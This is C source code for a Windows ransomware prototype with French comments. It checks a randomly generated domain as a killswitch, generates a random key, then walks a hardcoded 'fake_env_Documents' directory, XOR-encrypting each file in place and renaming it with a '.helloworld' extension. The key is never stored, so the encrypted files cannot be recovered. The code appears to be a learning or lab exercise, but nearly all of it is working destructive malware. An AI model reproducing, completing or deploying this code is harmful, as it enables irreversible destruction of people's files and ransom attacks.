#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <wincrypt.h>
#include <tchar.h>
#include <strsafe.h>

#pragma comment(lib, "wininet.lib")

#define AES_KEY_SIZE 32
const int RAND_URL_LEN = 40;

// Génère une chaîne aléatoire de lettres a-z
void generate_random_string(char *str, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < length; i++) {
        int key = rand() % (sizeof(charset) - 1);
        str[i] = charset[key];
    }
    str[length] = '\0';
}

// Retourne true si la requête GET réussit (on a un handle valide)
int killswitch_triggered(const char *url) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) return 0;
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, 0);
    if (hConnect) {
        // Si on a un handle, l'URL existe (killswitch actif)
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }
    InternetCloseHandle(hInternet);
    return 0;
}

int generate_aes_key(BYTE *key, DWORD key_len) {
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return 0;
    }
    if (!CryptGenRandom(hProv, key_len, key)) {
        CryptReleaseContext(hProv, 0);
        return 0;
    }
    CryptReleaseContext(hProv, 0);
    return 1;
}

int encrypt_file(const char *filepath, const BYTE *key, DWORD key_len) {
    FILE *file = fopen(filepath, "rb+");
    if (!file) return 0;

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    rewind(file);

    BYTE *buffer = (BYTE *)malloc(filesize);
    if (!buffer) {
        fclose(file);
        return 0;
    }

    fread(buffer, 1, filesize, file);

    // XOR simple pour la démo (remplace par AES plus tard)
    for (long i = 0; i < filesize; i++) {
        buffer[i] ^= key[i % key_len];
    }

    rewind(file);
    fwrite(buffer, 1, filesize, file);
    fclose(file);
    free(buffer);
    char new_filepath[MAX_PATH];
    snprintf(new_filepath, sizeof(new_filepath), "%s.helloworld", filepath);
    // Renommer le fichier
    if (!MoveFileA(filepath, new_filepath)) {
        fprintf(stderr, "[!] Failed to rename file: %s\n", filepath);
        return 0;
    }
    return 1;
}

void encrypt_directory(const char *dirpath, const BYTE *key, DWORD key_len) {
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", dirpath);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", dirpath, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_directory(fullpath, key, key_len);
        } else {
            printf("[*] Encrypting: %s\n", fullpath);
            encrypt_file(fullpath, key, key_len);
        }

    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}


int main() {
    srand((unsigned int)time(NULL));
    char rand_domain[RAND_URL_LEN + 1];
    generate_random_string(rand_domain, RAND_URL_LEN);
    char url[256];
    snprintf(url, sizeof(url), "http://%s.com", rand_domain);
    printf("[*] Testing URL: %s\n", url);
    if (killswitch_triggered(url)) {
        printf("[!] Killswitch triggered! Exiting...\n");
        return 0;
    }
    printf("[+] No killswitch found. Continuing execution...\n");
    // Génération de la clé AES
    BYTE aes_key[AES_KEY_SIZE];
    if (!generate_aes_key(aes_key, AES_KEY_SIZE)) {
        fprintf(stderr, "[!] Failed to generate AES key\n");
        return 1;
    }

    printf("[+] AES key generated. Encrypting files...\n");

    // Chiffrement du dossier
    const char *target_dir = "C:\\Users\\fsali\\Documents\\fake_env_Documents";
    encrypt_directory(target_dir, aes_key, AES_KEY_SIZE);

    printf("[+] Encryption completed.\n");
    return 0;
}
